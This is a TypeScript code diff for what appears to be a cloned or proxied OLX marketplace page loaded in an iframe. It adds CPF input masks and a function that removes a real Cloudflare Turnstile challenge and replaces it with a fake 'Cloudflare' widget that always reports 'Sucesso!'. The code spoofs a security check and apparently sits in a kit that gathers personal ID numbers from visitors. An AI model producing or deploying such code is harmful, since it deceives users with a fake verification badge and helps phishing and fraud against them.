@@ -142,11 +142,163 @@ export function attachIframeInteractions(doc: Document): () => void {
   fixGoogleSignIn();
   const timers = [400, 1000, 2000, 3500, 5000].map((t) => setTimeout(fixGoogleSignIn, t));
 
+  // Máscaras / limites de formulário + Cloudflare fake
+  enhanceForms(doc);
+  const formTimers = [300, 800, 1500, 3000].map((t) => setTimeout(() => enhanceForms(doc), t));
+
   return () => {
     doc.removeEventListener("click", onClick, true);
     doc.getElementById("__olx_help_modal_host__")?.remove();
     timers.forEach(clearTimeout);
+    formTimers.forEach(clearTimeout);
   };
+}
+
+// =====================================================================
+// Formulário: máscaras, limites e simulação do Cloudflare Turnstile
+// =====================================================================
+function enhanceForms(doc: Document): void {
+  const allInputs = Array.from(doc.querySelectorAll<HTMLInputElement>("input"));
+
+  const isCpfInput = (el: HTMLInputElement) => {
+    const hay = [
+      el.name,
+      el.id,
+      el.placeholder,
+      el.getAttribute("aria-label") || "",
+      el.autocomplete || "",
+    ]
+      .join(" ")
+      .toLowerCase();
+    return /cpf/.test(hay);
+  };
+
+  const isNameInput = (el: HTMLInputElement) => {
+    const hay = [
+      el.name,
+      el.id,
+      el.placeholder,
+      el.getAttribute("aria-label") || "",
+      el.autocomplete || "",
+    ]
+      .join(" ")
+      .toLowerCase();
+    return /(nome|name)/.test(hay) && !/user|usuario|email|sobrenome/.test(hay);
+  };
+
+  const formatCpf = (raw: string) => {
+    const digits = raw.replace(/\D/g, "").slice(0, 11);
+    let out = digits;
+    if (digits.length > 9) {
+      out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
+    } else if (digits.length > 6) {
+      out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
+    } else if (digits.length > 3) {
+      out = `${digits.slice(0, 3)}.${digits.slice(3)}`;
+    }
+    return out;
+  };
+
+  allInputs.forEach((input) => {
+    if ((input as any).dataset.olxEnhanced === "1") return;
+
+    if (isCpfInput(input)) {
+      input.setAttribute("inputmode", "numeric");
+      input.setAttribute("maxlength", "14");
+      input.setAttribute("autocomplete", "off");
+      const onInput = () => {
+        const formatted = formatCpf(input.value);
+        if (input.value !== formatted) input.value = formatted;
+      };
+      input.addEventListener("input", onInput);
+      (input as any).dataset.olxEnhanced = "1";
+      return;
+    }
+
+    if (isNameInput(input)) {
+      input.setAttribute("maxlength", "80");
+      input.setAttribute("autocomplete", "name");
+      (input as any).dataset.olxEnhanced = "1";
+      return;
+    }
+
+    // Limite genérico pra qualquer outro input de texto sem maxlength
+    const type = (input.type || "text").toLowerCase();
+    if (["text", "email", "tel", "search", "url", "password"].includes(type) && !input.hasAttribute("maxlength")) {
+      input.setAttribute("maxlength", "120");
+    }
+    (input as any).dataset.olxEnhanced = "1";
+  });
+
+  injectFakeTurnstile(doc);
+}
+
+function injectFakeTurnstile(doc: Document): void {
+  if (doc.getElementById("__olx_turnstile_fake__")) return;
+
+  // Procura algum container que pareça ser o Turnstile/Cloudflare
+  const candidates = Array.from(
+    doc.querySelectorAll<HTMLElement>(
+      '.cf-turnstile, [class*="turnstile" i], [data-sitekey], iframe[src*="challenges.cloudflare"], iframe[src*="turnstile"]',
+    ),
+  );
+
+  let host: HTMLElement | null = null;
+  if (candidates.length) {
+    const node = candidates[0];
+    host = (node.closest('[class*="turnstile" i], .cf-turnstile') as HTMLElement | null) || node.parentElement || node;
+  } else {
+    // Fallback: procura por texto "verificando" / "verifying" no formulário
+    const textHit = Array.from(doc.querySelectorAll<HTMLElement>("form *")).find((el) => {
+      const t = (el.textContent || "").trim().toLowerCase();
+      return t.length < 60 && /(verificando|verifying|sou humano|not a robot)/.test(t);
+    });
+    if (textHit) host = textHit.closest("div") || textHit.parentElement;
+  }
+
+  if (!host) return;
+
+  host.innerHTML = "";
+  const wrapper = doc.createElement("div");
+  wrapper.id = "__olx_turnstile_fake__";
+  wrapper.setAttribute(
+    "style",
+    [
+      "display:flex",
+      "align-items:center",
+      "gap:12px",
+      "padding:10px 14px",
+      "border:1px solid #e0e0e0",
+      "border-radius:8px",
+      "background:#fafafa",
+      "font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif",
+      "font-size:14px",
+      "color:#1a1a1a",
+      "max-width:320px",
+    ].join(";"),
+  );
+  wrapper.innerHTML = `
+    <div id="__olx_ts_indicator__" style="width:22px;height:22px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+      <div style="width:18px;height:18px;border:2px solid #d0d0d0;border-top-color:#f48120;border-radius:50%;animation:olxSpin .8s linear infinite;"></div>
+    </div>
+    <span id="__olx_ts_label__" style="flex:1;">Verificando...</span>
+    <span style="font-size:11px;color:#888;">Cloudflare</span>
+    <style>@keyframes olxSpin{to{transform:rotate(360deg)}}</style>
+  `;
+  host.appendChild(wrapper);
+
+  setTimeout(() => {
+    const indicator = wrapper.querySelector<HTMLElement>("#__olx_ts_indicator__");
+    const label = wrapper.querySelector<HTMLElement>("#__olx_ts_label__");
+    if (indicator) {
+      indicator.innerHTML = `
+        <div style="width:22px;height:22px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        </div>
+      `;
+    }
+    if (label) label.textContent = "Sucesso!";
+  }, 2800);
 }
 
 /**
